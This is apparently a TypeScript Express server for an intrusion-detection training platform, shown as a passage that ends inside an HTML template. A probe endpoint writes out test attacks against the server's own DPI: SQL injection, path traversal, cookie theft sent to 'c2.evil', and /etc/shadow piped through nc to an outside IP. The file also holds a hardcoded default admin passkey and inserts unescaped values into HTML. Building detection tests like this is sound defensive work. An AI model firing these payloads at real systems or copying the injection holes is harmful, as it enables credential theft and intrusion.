/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import express from 'express';
import bcryptjs from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { createServer } from 'http';
import { WebSocketServer, WebSocket } from 'ws';
import path from 'path';
import fs from 'fs';
import { createServer as createViteServer } from 'vite';
import { DbSchema } from './server/db/schema.js';
import { DEFAULT_DB } from './server/db/seed.js';
import { firestoreSyncService } from './server/db/firestore.js';
import { mssqlSyncService } from './server/db/mssql.js';
import { createAuthRouter, getJwtSecret } from './server/routes/auth.js';
import { createApiRouter } from './server/routes/api.js';
import { createHealthRouter } from './server/routes/health.js';
import { CorrelationEngine } from './server/services/correlationEngine.js';
import { createIngestRouter } from './server/services/agentIngestion.js';
import { Packet, LiveActivity, AuditLog, KillChainStage } from './src/types.js';
import { DEFAULT_BILLING_CONFIG } from './src/utils/subscription.js';
import {
  filterHostsForUser,
  sanitizeOwnedHosts,
  filterAlertsForUser,
  filterThreatsForUser,
  isAlertOwnedByUser,
} from './src/utils/hostOwnership.js';
import { inspectHttpIngressPayload } from './server/services/dpiSignatures.js';
import { evaluateUserCertificationStatus } from './src/utils/certificationStatus.js';
import { setAdminGmailRefreshMode, setAdminGmailLastEmail } from './server/services/adminGmailSender.js';

function isFalsePositiveAlert(a: any): boolean {
  if (!a || !a.id) return true;
  if (!a.id.startsWith('alt_real_') && !a.ownerId && !a.hostId) return true;
  // Purge legacy unowned DPI false positives (pre-fix User-Agent semicolon matches on /, /src/*, /api/*)
  if (!a.ownerId && !a.hostId && a.ruleId === 'rul_real_dpi') return true;
  const desc = String(a.description || '');
  if (!a.ownerId && !a.hostId && (desc.includes('"/api/') || desc.includes('"/src/') || desc.includes('to "/"') || desc.includes('"/assets/'))) {
    return true;
  }
  return false;
}

const PORT = process.env.CONTROL_PLANE_PORT 
  ? 3000 
  : (Number(process.env.PORT) || 3000);
const DB_FILE = path.join(process.cwd(), 'db.json');

// --- DATABASE STORE & LOCAL PERSISTENCE ---
let dbState: DbSchema = { ...DEFAULT_DB };

function loadDb() {
  try {
    if (fs.existsSync(DB_FILE)) {
      const data = fs.readFileSync(DB_FILE, 'utf8');
      const parsed = JSON.parse(data);
      dbState = { ...DEFAULT_DB, ...parsed };
      dbState.incidents = (parsed.incidents && parsed.incidents.length > 0) ? parsed.incidents : DEFAULT_DB.incidents;
      const rawEvents = (parsed.securityEvents && parsed.securityEvents.length > 0) ? parsed.securityEvents : DEFAULT_DB.securityEvents;
      const seenEventIds = new Set<string>();
      dbState.securityEvents = (rawEvents || []).filter(evt => {
        if (!evt || !evt.id) return false;
        if (seenEventIds.has(evt.id)) return false;
        seenEventIds.add(evt.id);
        return true;
      });
      dbState.activeResponses = (parsed.activeResponses && parsed.activeResponses.length > 0) ? parsed.activeResponses : DEFAULT_DB.activeResponses;
      // Sanitize: Purge legacy synthetic records, false-positive DPI alerts, unowned hosts, and orphaned threats
      dbState.hosts = sanitizeOwnedHosts(dbState.hosts);
      dbState.alerts = (dbState.alerts || []).filter(a => !isFalsePositiveAlert(a));
      dbState.certificates = (dbState.certificates || []).filter(c => c && c.userId && !c.userId.startsWith('usr_seed_'));
      const realAlertIds = new Set((dbState.alerts || []).map(a => a.id));
      dbState.threats = (dbState.threats || []).filter(t => t && t.associatedAlerts && t.associatedAlerts.some((id: string) => realAlertIds.has(id)));

      if (dbState.certificates && Array.isArray(dbState.certificates)) {
        dbState.certificates = dbState.certificates.map(cert => ({
          ...cert,
          attestationStatement: (cert.attestationStatement || '').replace(/ and Chukwuemeka Odumegwu Ojukwu University \(COOU\)/gi, '')
        }));
      }
      // Ensure billingConfig and payments arrays are initialized
      dbState.billingConfig = {
        ...DEFAULT_BILLING_CONFIG,
        ...(parsed.billingConfig || {}),
        nowPaymentsUrl: DEFAULT_BILLING_CONFIG.nowPaymentsUrl,
        nowPaymentsInvoiceId: DEFAULT_BILLING_CONFIG.nowPaymentsInvoiceId,
        priceUsd: DEFAULT_BILLING_CONFIG.priceUsd,
        billingCycleMonths: DEFAULT_BILLING_CONFIG.billingCycleMonths,
        billingCycleDays: DEFAULT_BILLING_CONFIG.billingCycleDays,
      };
      dbState.payments = Array.isArray(parsed.payments) ? parsed.payments : [];
      dbState.adminGmailRefreshMode = parsed.adminGmailRefreshMode === 'manual' ? 'manual' : 'auto';
      setAdminGmailRefreshMode(dbState.adminGmailRefreshMode);
      if (parsed.adminGmailLastEmail === null) {
        dbState.adminGmailLastEmail = null;
      } else if (typeof parsed.adminGmailLastEmail === 'string' && parsed.adminGmailLastEmail.trim()) {
        dbState.adminGmailLastEmail = parsed.adminGmailLastEmail.trim();
      } else {
        const gmailAdmin = (dbState.users || []).find(
          (u) => u.role === 'admin' && typeof u.email === 'string' && u.email.toLowerCase().endsWith('@gmail.com')
        );
        dbState.adminGmailLastEmail = gmailAdmin ? gmailAdmin.email : null;
      }
      setAdminGmailLastEmail(dbState.adminGmailLastEmail);

      // Ensure admin user has separate Safe Box defaults and active subscription initialized
      const ensureAdminSafeBoxDefaults = () => {
        const defaultSafeBoxPasskey = process.env.ADMIN_SAFEBOX_PASSKEY || 'En1!🔐9';
        (dbState.users || []).forEach((u) => {
          if (u.role === 'admin' && u.safeBoxEnabled === undefined && !u.safeBoxPasskeyHash) {
            u.safeBoxEnabled = true;
            u.safeBoxPasskeyHash = bcryptjs.hashSync(defaultSafeBoxPasskey, 10);
          }
          if (u.role === 'admin' && !u.subscriptionStatus) {
            u.subscriptionStatus = 'active';
          }
          if (u.role !== 'admin' && !u.subscriptionStatus) {
            u.subscriptionStatus = 'inactive';
          }
        });
      };
      ensureAdminSafeBoxDefaults();
      saveDb();
    } else {
      saveDb();
    }
    // Asynchronously synchronize with Firestore
    firestoreSyncService.syncFromFirestore(dbState, () => {
      const unownedHosts = (dbState.hosts || []).filter(h => h && !h.ownerId);
      unownedHosts.forEach((h) => {
        if (h.id) firestoreSyncService.deleteDocument('hosts', h.id);
      });
      dbState.hosts = sanitizeOwnedHosts(dbState.hosts);
      const fpAlerts = (dbState.alerts || []).filter(a => isFalsePositiveAlert(a));
      fpAlerts.forEach((a) => {
        if (a?.id) firestoreSyncService.deleteDocument('alerts', a.id);
      });
      dbState.alerts = (dbState.alerts || []).filter(a => !isFalsePositiveAlert(a));
      dbState.certificates = (dbState.certificates || []).filter(c => c && c.userId && !c.userId.startsWith('usr_seed_'));
      const liveAlertIds = new Set((dbState.alerts || []).map(a => a.id));
      dbState.threats = (dbState.threats || []).filter(t => t && t.associatedAlerts && t.associatedAlerts.some((id: string) => liveAlertIds.has(id)));
      if (dbState.certificates && Array.isArray(dbState.certificates)) {
        dbState.certificates = dbState.certificates.map(cert => ({
          ...cert,
          attestationStatement: (cert.attestationStatement || '').replace(/ and Chukwuemeka Odumegwu Ojukwu University \(COOU\)/gi, '')
        }));
      }
      const defaultSafeBoxPasskey = process.env.ADMIN_SAFEBOX_PASSKEY || 'En1!🔐9';
      (dbState.users || []).forEach((u) => {
        if (u.role === 'admin' && u.safeBoxEnabled === undefined && !u.safeBoxPasskeyHash) {
          u.safeBoxEnabled = true;
          u.safeBoxPasskeyHash = bcryptjs.hashSync(defaultSafeBoxPasskey, 10);
        }
        if (u.role === 'admin' && !u.subscriptionStatus) {
          u.subscriptionStatus = 'active';
        }
        if (u.role !== 'admin' && !u.subscriptionStatus) {
          u.subscriptionStatus = 'inactive';
        }
      });
      dbState.billingConfig = {
        ...DEFAULT_BILLING_CONFIG,
        ...(dbState.billingConfig || {}),
        nowPaymentsUrl: DEFAULT_BILLING_CONFIG.nowPaymentsUrl,
        nowPaymentsInvoiceId: DEFAULT_BILLING_CONFIG.nowPaymentsInvoiceId,
        priceUsd: DEFAULT_BILLING_CONFIG.priceUsd,
        billingCycleMonths: DEFAULT_BILLING_CONFIG.billingCycleMonths,
        billingCycleDays: DEFAULT_BILLING_CONFIG.billingCycleDays,
      };
      dbState.payments = Array.isArray(dbState.payments) ? dbState.payments : [];
      dbState.adminGmailRefreshMode = dbState.adminGmailRefreshMode === 'manual' ? 'manual' : 'auto';
      setAdminGmailRefreshMode(dbState.adminGmailRefreshMode);
      if (dbState.adminGmailLastEmail === null) {
        dbState.adminGmailLastEmail = null;
      } else if (typeof dbState.adminGmailLastEmail === 'string' && dbState.adminGmailLastEmail.trim()) {
        dbState.adminGmailLastEmail = dbState.adminGmailLastEmail.trim();
      } else {
        const gmailAdmin = (dbState.users || []).find(
          (u) => u.role === 'admin' && typeof u.email === 'string' && u.email.toLowerCase().endsWith('@gmail.com')
        );
        dbState.adminGmailLastEmail = gmailAdmin ? gmailAdmin.email : null;
      }
      setAdminGmailLastEmail(dbState.adminGmailLastEmail);
      saveDb();
    }).catch(err => {
      console.error('[Persistence] Failed initial sync from Firestore:', err);
    });
  } catch (err) {
    console.error('[Persistence] Error loading DB file, falling back to seed:', err);
  }
}

function saveDbToFileOnly() {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(dbState, null, 2), 'utf8');
  } catch (err) {
    console.error('[Persistence] Failed to write database file:', err);
  }
}

function saveDb() {
  saveDbToFileOnly();
  firestoreSyncService.triggerSync(dbState);
  if (mssqlSyncService.isConnected) {
    mssqlSyncService.syncAll(dbState).catch(err => {
      console.error('[MSSQL] Dual-sync error:', err);
    });
  }
}

// Initial DB load
loadDb();

// --- EXPRESS APP SETUP ---
const app = express();
app.use(express.json());

// Dynamic CORS configuration
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, x-secret-passkey');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Create HTTP Server
const httpServer = createServer(app);

// --- WEBSOCKET ENGINE ---
const wss = new WebSocketServer({ noServer: true });
const activeConnections = new Set<WebSocket>();

wss.on('connection', (ws: WebSocket, request: any) => {
  let wsUserId: string | null = null;
  let wsUserRole: string | null = null;

  try {
    const reqUrl = new URL(request?.url || '/ws', 'http://localhost');
    const token = reqUrl.searchParams.get('token');
    if (token) {
      const decoded: any = jwt.verify(token, getJwtSecret());
      if (decoded?.id) {
        wsUserId = decoded.id;
        wsUserRole = decoded.role || null;
      }
    }
  } catch {
    wsUserId = null;
  }

  (ws as any).userId = wsUserId;
  (ws as any).userRole = wsUserRole;
  activeConnections.add(ws);
  
  const wsUserHosts = filterHostsForUser(dbState.hosts, wsUserId);
  const wsUserAlerts = filterAlertsForUser(dbState.alerts, wsUserHosts, wsUserId);
  const wsUserThreats = filterThreatsForUser(dbState.threats, wsUserHosts, wsUserAlerts, wsUserId);
  const wsUser = wsUserId ? dbState.users.find(u => u.id === wsUserId) : null;
  const wsProgress = wsUserId
    ? (dbState.workbookProgress || []).find(
        p => p.userId === wsUserId || (wsUser?.email && p.email?.toLowerCase() === wsUser.email.toLowerCase())
      ) || null
    : null;
  const wsCertificationStatus = wsUserId
    ? evaluateUserCertificationStatus({
        userId: wsUserId,
        userEmail: wsUser?.email,
        progress: wsProgress,
        certificates: dbState.certificates || [],
      })
    : null;

  // Initial state transmission (hosts, alerts, threats, and certification status strictly scoped to user)
  ws.send(JSON.stringify({
    type: 'INIT',
    payload: {
      hosts: wsUserHosts,
      alerts: wsUserAlerts,
      threats: wsUserThreats,
      certificationStatus: wsCertificationStatus,
      rules: dbState.rules,
      threatIntel: dbState.threatIntel,
      mlModels: dbState.mlModels,
      quarantine: dbState.quarantine,
      incidents: dbState.incidents,
      sensors: dbState.sensors,
      activeResponses: dbState.activeResponses,
      securityEvents: dbState.securityEvents ? dbState.securityEvents.slice(0, 50) : [],
      liveActivities: dbState.liveActivities.slice(0, 30),
      auditLogs: dbState.auditLogs.slice(0, 30)
    }
  }));

  ws.on('close', () => {
    activeConnections.delete(ws);
  });
});

httpServer.on('upgrade', (request, socket, head) => {
  if (request.url?.startsWith('/ws')) {
    wss.handleUpgrade(request, socket, head, (ws) => {
      wss.emit('connection', ws, request);
    });
  } else {
    socket.destroy();
  }
});

function broadcastToAllWebsockets(message: any) {
  if (message?.type === 'HOSTS_UPDATE' && Array.isArray(message.payload)) {
    for (const ws of activeConnections) {
      if (ws.readyState === WebSocket.OPEN) {
        const wsUserId = (ws as any).userId || null;
        ws.send(JSON.stringify({
          type: 'HOSTS_UPDATE',
          payload: filterHostsForUser(message.payload, wsUserId)
        }));
      }
    }
    return;
  }

  if (message?.type === 'ALERTS_UPDATE' && Array.isArray(message.payload)) {
    for (const ws of activeConnections) {
      if (ws.readyState === WebSocket.OPEN) {
        const wsUserId = (ws as any).userId || null;
        const wsHosts = filterHostsForUser(dbState.hosts, wsUserId);
        ws.send(JSON.stringify({
          type: 'ALERTS_UPDATE',
          payload: filterAlertsForUser(message.payload, wsHosts, wsUserId)
        }));
      }
    }
    return;
  }

  if (message?.type === 'THREATS_UPDATE' && Array.isArray(message.payload)) {
    for (const ws of activeConnections) {
      if (ws.readyState === WebSocket.OPEN) {
        const wsUserId = (ws as any).userId || null;
        const wsHosts = filterHostsForUser(dbState.hosts, wsUserId);
        const wsAlerts = filterAlertsForUser(dbState.alerts, wsHosts, wsUserId);
        ws.send(JSON.stringify({
          type: 'THREATS_UPDATE',
          payload: filterThreatsForUser(message.payload, wsHosts, wsAlerts, wsUserId)
        }));
      }
    }
    return;
  }

  if (message?.type === 'ALERT_TRIGGERED' && message.payload) {
    for (const ws of activeConnections) {
      if (ws.readyState === WebSocket.OPEN) {
        const wsUserId = (ws as any).userId || null;
        const wsHosts = filterHostsForUser(dbState.hosts, wsUserId);
        if (isAlertOwnedByUser(message.payload, wsHosts, wsUserId)) {
          ws.send(JSON.stringify(message));
        }
      }
    }
    return;
  }

  if ((message?.type === 'CERTIFICATION_STATUS_UPDATE' || message?.type === 'CERTIFICATION_REMINDER') && message.payload?.userId) {
    const targetUserId = message.payload.userId;
    const serialized = JSON.stringify(message);
    for (const ws of activeConnections) {
      if (ws.readyState === WebSocket.OPEN && (ws as any).userId === targetUserId) {
        ws.send(serialized);
      }
    }
    return;
  }

  const serialized = JSON.stringify(message);
  for (const ws of activeConnections) {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(serialized);
    }
  }
}

// Audit log helper
function addAuditLog(
  userId: string, 
  email: string, 
  action: string, 
  resource: string, 
  ip: string, 
  status: 'success' | 'failure', 
  explicitRole?: string
) {
  let role = explicitRole;
  if (!role && userId && userId !== 'guest') {
    const foundUser = dbState.users.find(u => u.id === userId || u.email?.toLowerCase() === email?.toLowerCase());
    if (foundUser) role = foundUser.role;
  }
  if (!role && email && (email.toLowerCase().startsWith('admin') || email.toLowerCase().includes('admin@'))) {
    role = 'admin';
  }

  const log: AuditLog = {
    id: 'aud_' + Math.random().toString(36).substring(2, 9),
    timestamp: new Date().toISOString(),
    userId,
    userEmail: email,
    userRole: role || 'analyst',
    action,
    resource,
    ipAddress: ip,
    status
  };
  dbState.auditLogs.unshift(log);
  if (dbState.auditLogs.length > 200) dbState.auditLogs.pop();
  
  const activity: LiveActivity = {
    id: 'act_' + Math.random().toString(36).substring(2, 9),
    timestamp: log.timestamp,
    userId,
    userEmail: email,
    userRole: role || 'analyst',
    action: action.toLowerCase().replace(/ /g, '_'),
    details: `${action} on resource: ${resource} [${status.toUpperCase()}]`
  };
  dbState.liveActivities.unshift(activity);
  if (dbState.liveActivities.length > 200) dbState.liveActivities.pop();
  
  saveDb();
  broadcastToAllWebsockets({ type: 'AUDIT_LOG', payload: log });
  broadcastToAllWebsockets({ type: 'LIVE_ACTIVITY', payload: activity });
}

// --- REAL-TIME INGRESS TRAFFIC SNIFFER & DEEP PACKET INSPECTION (DPI) ---
// Analyzes real HTTP requests, headers, and payloads against actual attack signatures.
// Real Ingress Pipeline: authentic network traffic and real attacks are captured and alerted.

let realPacketCount = 1420;
let realPacketsThisWindow = 0;
let lastRateCheck = Date.now();
let currentPacketsPerSec = 1;

// Calculate real rate per second based on actual ingress traffic
setInterval(() => {
  const now = Date.now();
  const diffSec = (now - lastRateCheck) / 1000;
  if (diffSec >= 1) {
    currentPacketsPerSec = Math.max(1, Math.round(realPacketsThisWindow / diffSec));
    realPacketsThisWindow = 0;
    lastRateCheck = now;
  }
}, 1000);

// Instantiate correlation engine before middleware so real attacks can be processed immediately
const correlationEngine = new CorrelationEngine(dbState, saveDb, broadcastToAllWebsockets, addAuditLog);

// Live HTTP Ingress Sniffer Middleware
app.use((req, res, next) => {
  // Filter out static internal Vite bundle assets and TypeScript/React module fetches to focus on API and ingress traffic
  if (
    req.path.startsWith('/@') ||
    req.path.startsWith('/node_modules') ||
    req.path.startsWith('/src/') ||
    req.path.match(/\.(js|mjs|ts|tsx|jsx|css|svg|png|jpg|jpeg|gif|webp|ico|woff2?|ttf|map)$/i)
  ) {
    return next();
  }

  realPacketCount++;
  realPacketsThisWindow++;

  const rawIp = (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() || req.socket.remoteAddress || '127.0.0.1';
  const cleanIp = rawIp.replace(/^::ffff:/, '');
  let urlToScan = req.originalUrl || req.url || '';
  try {
    urlToScan = decodeURIComponent(urlToScan);
  } catch {
    // Keep raw URL if malformed percent encoding
  }
  const bodyString = typeof req.body === 'object' ? JSON.stringify(req.body) : String(req.body || '');
  const userAgent = String(req.headers['user-agent'] || '');

  const detectedAttack = inspectHttpIngressPayload({
    path: req.path,
    urlToScan,
    bodyString,
    userAgent,
  });

  const packetLength = Number(req.headers['content-length']) || Buffer.byteLength(`${urlToScan} ${bodyString}`, 'utf8') + 72;
  const isSuspicious = !!detectedAttack;
  const probeTargetHost = req.headers['x-probe-target-host'] ? String(req.headers['x-probe-target-host']) : undefined;
  const probeOwnerId = req.headers['x-probe-owner-id'] ? String(req.headers['x-probe-owner-id']) : undefined;
  const targetLabel = probeTargetHost || req.headers.host || 'gateway';

  const realPacket: Packet = {
    id: 'pkt_' + Math.random().toString(36).substring(2, 9),
    timestamp: new Date().toISOString(),
    sourceIp: cleanIp,
    destIp: targetLabel,
    destinationIp: targetLabel,
    protocol: (req.protocol.toUpperCase() as any) || 'HTTP',
    length: packetLength,
    flags: req.method,
    payloadInfo: `${req.method} ${req.path}`,
    payloadSample: urlToScan.length > 60 ? urlToScan.substring(0, 60) + '...' : urlToScan,
    suspicious: isSuspicious,
    ruleId: isSuspicious ? 'rul_real_dpi' : undefined
  };

  // Broadcast real packet over WebSocket
  broadcastToAllWebsockets({
    type: 'LIVE_PACKET',
    payload: {
      packet: realPacket,
      totalPackets: realPacketCount,
      totalPacketCount: realPacketCount,
      ratePerSec: Math.max(1, currentPacketsPerSec)
    }
  });

  // If a real attack signature is matched, log a real Alert and trigger Correlation Engine
  if (detectedAttack) {
    const matchedEnrolledHost = dbState.hosts.find((h) => {
      if (probeOwnerId && h.ownerId !== probeOwnerId) return false;
      const targetLower = targetLabel.toLowerCase();
      return (h.name && targetLower.includes(h.name.toLowerCase())) || (h.ipAddress && targetLower.includes(h.ipAddress.toLowerCase()));
    });

    const realAlert = {
      id: 'alt_real_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
      ownerId: probeOwnerId || matchedEnrolledHost?.ownerId,
      hostId: matchedEnrolledHost?.id,
      timestamp: new Date().toISOString(),
      severity: detectedAttack.severity,
      title: `Live Attack Detected: ${detectedAttack.category}`,
      description: `Real HTTP ${req.method} request from IP ${cleanIp} to "${req.path}" matched live signature: ${detectedAttack.category}.`,
      category: detectedAttack.category,
      source: cleanIp,
      target: targetLabel,
      status: 'unhandled' as const,
      ruleId: 'rul_real_dpi',
      mitreMapping: `${detectedAttack.mitre.technique} (${detectedAttack.mitre.tactic})`
    };

    dbState.alerts.unshift(realAlert);
    if (dbState.alerts.length > 100) dbState.alerts.pop();

    const rawEvent = {
      id: 'evt_real_' + Math.random().toString(36).substring(2, 9),
      ownerId: realAlert.ownerId,
      hostId: realAlert.hostId,
      timestamp: realAlert.timestamp,
      sourceType: 'suricata' as const,
      sensorId: 'realtime-http-dpi',
      sourceIp: cleanIp,
      destIp: targetLabel,
      destPort: 443,
      protocol: 'HTTP',
      eventType: 'exploit_detected',
      details: {
        method: req.method,
        path: req.path,
        signature: detectedAttack.category,
        userAgent: req.headers['user-agent']
      },
      severity: detectedAttack.severity,
      confidence: 0.98,
      mitre: detectedAttack.mitre
    };

    // correlationEngine.processEvent handles storing rawEvent into dbState.securityEvents, saving, and broadcasting
    addAuditLog(realAlert.ownerId || 'system', 'soc-engine@encdec.io', `Real Ingress Attack Intercepted: ${detectedAttack.category}`, req.path, cleanIp, 'success');
    broadcastToAllWebsockets({ type: 'ALERTS_UPDATE', payload: dbState.alerts });
    correlationEngine.processEvent(rawEvent).catch(console.error);
  }

  next();
});

// --- ROUTER MOUNTING ---
const { router: authRouter, authenticateToken } = createAuthRouter(dbState, saveDb, addAuditLog, broadcastToAllWebsockets);
const apiRouter = createApiRouter(dbState, saveDb, addAuditLog, broadcastToAllWebsockets, authenticateToken, activeConnections, DB_FILE, correlationEngine);
const ingestRouter = createIngestRouter(dbState, saveDb, correlationEngine, broadcastToAllWebsockets, addAuditLog);
const healthRouter = createHealthRouter(() => activeConnections.size);

app.use('/api/auth', authRouter);
app.use('/api', authRouter);
app.use('/api/ingest', ingestRouter);
app.use('/api', healthRouter);
app.use('/api', apiRouter);

// REAL-TIME SECURITY PROBE DISPATCHER
// Executes an actual live malicious HTTP request across the server's HTTP port
// so operators can test the real Deep Packet Inspection (DPI) firewall live.
app.post('/api/probe/live-attack', async (req, res) => {
  const vector = req.body?.vector || 'sqli';
  const attackerIp = (req.body?.attackerIp as string) || (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() || '185.220.101.42';

  let probePath = '';
  let probeHeader = {};
  let vectorName = '';

  if (vector === 'sqli') {
    probePath = `/api/student/records?department=cybersec' UNION SELECT 1,username,password_hash FROM users WHERE '1'='1--`;
    vectorName = 'SQL Injection (SQLi) Extraction';
  } else if (vector === 'traversal') {
    probePath = `/api/files/download?path=../../../../etc/passwd`;
    vectorName = 'Local File Inclusion / Directory Traversal';
  } else if (vector === 'scanner') {
    probePath = `/.env?secret=eval&debug=true`;
    vectorName = 'Reconnaissance Secret Scraper (.env sweep)';
  } else if (vector === 'xss') {
    probePath = `/api/comments?msg=<script>document.location='http://c2.evil/steal?c='+document.cookie</script>`;
    vectorName = 'Stored Cross-Site Scripting (XSS)';
  } else {
    probePath = `/api/exec?cmd=cat%20/etc/shadow%20|%20nc%20185.220.101.42%204444`;
    vectorName = 'Remote Command Injection';
  }

  try {
    let probeOwnerId: string | undefined;
    let probeTargetHost: string | undefined;
    const authHeader = req.headers.authorization;
    if (authHeader && authHeader.startsWith('Bearer ')) {
      try {
        const decoded: any = jwt.verify(authHeader.slice(7), getJwtSecret());
        if (decoded?.id) {
          probeOwnerId = decoded.id;
          const userHosts = filterHostsForUser(dbState.hosts, decoded.id);
          probeTargetHost = req.body?.targetHost || userHosts[0]?.name;
        }
      } catch {
        // Unauthenticated probe
      }
    }

    const forwardHeaders: Record<string, string> = {
      'x-forwarded-for': attackerIp,
      'user-agent': 'Mozilla/5.0 (Kali; Linux x86_64; rv:109.0) ThreatHunter/2.4'
    };
    if (probeOwnerId) forwardHeaders['x-probe-owner-id'] = probeOwnerId;
    if (probeTargetHost) forwardHeaders['x-probe-target-host'] = probeTargetHost;

    // Send actual real HTTP request over loopback port
    await fetch(`http://127.0.0.1:${PORT}${probePath}`, {
      method: 'GET',
      headers: forwardHeaders
    }).catch(() => null);

    res.json({
      status: 'ok',
      success: true,
      vector: vectorName,
      targetEndpoint: probePath,
      attackerOriginIp: attackerIp,
      message: `Real HTTP attack probe dispatched across wire. Inspected and logged by Real-Time DPI engine.`
    });
  } catch (err: any) {
    res.status(500).json({ error: `Probe failed: ${err.message}` });
  }
});

// --- PUBLIC CERTIFICATE VERIFICATION PAGE (FOR EMPLOYER QR SCANNING) ---
app.get(['/verify', '/verify/:certId'], (req, res, next) => {
  const certId = (req.params.certId || (req.query.id as string) || (req.query.certId as string) || '').trim();

  // If request wants JSON, hand over to next or send JSON
  if (req.headers.accept && req.headers.accept.includes('application/json')) {
    return next();
  }

  const certificates = dbState.certificates || [];
  let cert = certificates.find(c => c.certificateId.toLowerCase() === certId.toLowerCase());


  if (!cert) {
    return res.status(404).send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Certificate Not Found - EncDec IDS Registry</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
      </head>
      <body class="bg-gray-950 text-gray-200 min-h-screen flex items-center justify-center p-4 font-mono">
        <div class="max-w-md w-full bg-gray-900 border border-red-500/40 rounded-2xl p-6 shadow-2xl space-y-4 text-center">
          <div class="w-12 h-12 rounded-full bg-red-500/20 text-red-400 mx-auto flex items-center justify-center text-xl font-bold">✕</div>
          <h1 class="text-xl font-bold text-white font-sans">Certificate Not Found</h1>
          <p class="text-xs text-gray-400">The certificate ID "${certId || 'Unknown'}" could not be located in the official EncDec IDS Registry.</p>
          <a href="/" class="inline-block mt-4 px-4 py-2 rounded-xl bg-gray-800 hover:bg-gray-700 text-cyan-400 text-xs font-bold">Return to Security Console</a>
        </div>
      </body>
      </html>
    `);
  }

  // Render official verification document for employers
  const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Official Certificate Verification - EncDec IDS</title>
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
      <style>
        body { background-color: #060b14; color: #cbd5e1; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
      </style>
    </head>
    <body class="min-h-screen flex items-center justify-center p-4 sm:p-6">
      <div class="max-w-xl w-full bg-gray-900/95 border-2 border-emerald-500/50 rounded-2xl p-6 sm:p-8 shadow-[0_0_35px_rgba(16,185,129,0.2)] space-y-6 relative overflow-hidden backdrop-blur-md">
        
        <!-- Top Glow -->
        <div class="absolute -top-12 -right-12 w-48 h-48 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none"></div>
        <div class="absolute -bottom-12 -left-12 w-48 h-48 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none"></div>

        <!-- Header -->
        <div class="border-b border-gray-800 pb-5 text-center space-y-2">
          <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/15 border border-emerald-500/40 text-emerald-400 text-xs font-bold uppercase tracking-wider">
            <span>✓ OFFICIAL VERIFIED CREDENTIAL</span>
          </div>
          <h1 class="text-xl sm:text-2xl font-bold text-white font-sans tracking-tight pt-1">
            EncDec IDS Accreditation Registry
          </h1>
          <p class="text-[11px] text-gray-400">
            EncDec Cybersecurity Academy • Autonomous SOC Threat Operations
          </p>
        </div>

        <!-- Candidate Information as Requested -->
        <div class="bg-gray-950/80 rounded-xl p-5 border border-cyan-500/30 space-y-3.5 shadow-inner">
          <div class="text-[10px] text-cyan-400 uppercase tracking-widest font-bold border-b border-gray-800 pb-2">
            Candidate Identity Verification
          </div>

          <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
            <div class="bg-gray-900/90 p-3 rounded-lg border border-gray-800">
              <span class="text-[10px] text-gray-400 uppercase block font-bold">Last Name:</span>
              <span class="text-white font-bold text-sm tracking-wide">${cert.lastName}</span>
            </div>

            <div class="bg-gray-900/90 p-3 rounded-lg border border-gray-800">
              <span class="text-[10px] text-gray-400 uppercase block font-bold">First Name:</span>
              <span class="text-white font-bold text-sm tracking-wide">${cert.firstName}</span>
            </div>

            <div class="bg-gray-900/90 p-3 rounded-lg border border-gray-800">
              <span class="text-[10px] text-gray-400 uppercase block font-bold">Middle Name:</span>
              <span class="text-white font-bold text-sm tracking-wide">${cert.middleName || '<span class="text-gray-500 italic">None</span>'}</span>
            </div>
          </div>

          <!-- Quiz Score Displayed Prominently -->
          <div class="bg-emerald-950/40 border border-emerald-500/40 p-4 rounded-xl flex items-center justify-between gap-4 mt-2">
            <div>
              <span class="text-[10px] text-emerald-400 uppercase tracking-wider font-bold block">
                Capstone Knowledge Check Score Gotten:
              </span>
              <span class="text-white font-bold text-lg font-sans">
                ${cert.quizScore}% (Verified Operational Mastery)
              </span>
            </div>
            <div class="text-right">
              <span class="px-2.5 py-1 rounded bg-emerald-500/20 text-emerald-300 font-bold text-xs uppercase border border-emerald-500/40">
                PASSED (≥ 80%)
              </span>
            </div>
          </div>
        </div>

        <!-- Attestation Statement as Requested -->
        <div class="p-4 rounded-xl bg-gray-950/60 border border-gray-800 space-y-2 text-xs leading-relaxed">
          <span class="text-cyan-400 font-bold uppercase text-[10px] block tracking-wider">
            Official Certification Attestation:
          </span>
          <p class="text-gray-200 italic font-sans font-medium">
            "${cert.attestationStatement}"
          </p>
        </div>

        <!-- Credential Registry Details -->
        <div class="grid grid-cols-2 gap-3 text-[11px] bg-gray-950/40 p-3.5 rounded-xl border border-gray-800/80">
          <div>
            <span class="text-gray-500 uppercase block text-[9px]">Certificate Registry ID:</span>
            <span class="text-white font-bold">${cert.certificateId}</span>
          </div>

          <div>
            <span class="text-gray-500 uppercase block text-[9px]">Conferred Issue Date:</span>
            <span class="text-white font-bold">${cert.issueDate}</span>
          </div>

          <div class="col-span-2 pt-1 border-t border-gray-800/50">
            <span class="text-gray-500 uppercase block text-[9px]">Cryptographic SHA-256 Hash:</span>
            <span class="text-amber-400 font-mono text-[10px] break-all">${cert.verificationCode}</span>
          </div>
        </div>

        <!-- Action Controls -->
